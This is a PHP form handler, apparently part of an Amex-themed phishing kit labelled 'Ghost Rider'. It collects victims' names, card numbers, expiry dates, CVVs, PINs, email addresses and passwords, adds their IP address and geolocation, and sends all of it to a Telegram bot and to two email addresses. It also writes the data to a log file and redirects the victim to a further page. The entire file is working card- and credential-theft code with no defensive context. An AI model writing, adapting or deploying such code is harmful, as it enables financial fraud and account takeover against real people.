<?php
	
	$fuln = $_POST['name'];
	$cnum = $_POST['cnum'];
	$exp = $_POST['exp'];
	$cvv = $_POST['cvv'];
	$pin = $_POST['pin'];
	$email = $_POST['email'];
	$password = $_POST['password'];
	$serv = $_REQUEST['verify'];
	require_once('../Yourmail.php');
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }
	if($fuln != null && $cnum != null && $exp != null && $cvv != null && $pin != null && $email != null && $password != null){

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Full Name: ".$fuln."\n";
    $message .= "Credit/Debit Card Number: ".$cnum."\n";
    $message .= "Expiry Date (MM/YY): ".$exp."\n";
    $message .= "CVV: ".$cvv."\n";
    $message .= "4-digit Card ID: ".$pin."\n";
	$message .= "Email Address: ".$email."\n";
    $message .= "Password: ".$password."\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
	$handle = fopen("../JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "Amex - | $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	mail("$serv",$subject,$message,$headers);
	}
}
?>
<script>
	window.location="../personal.php";
</script>

